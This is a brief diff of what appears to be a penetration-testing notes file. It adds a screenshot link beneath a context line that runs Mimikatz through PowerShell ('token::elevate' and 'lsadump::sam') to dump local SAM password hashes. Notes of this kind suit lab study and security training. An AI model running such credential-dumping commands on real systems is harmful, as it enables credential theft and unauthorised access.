@@ -472,3 +472,4 @@ Enter-PSSession -Session $sess
 ```powershell
 Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 ```
+![[Pasted image 20231025114637.png]]
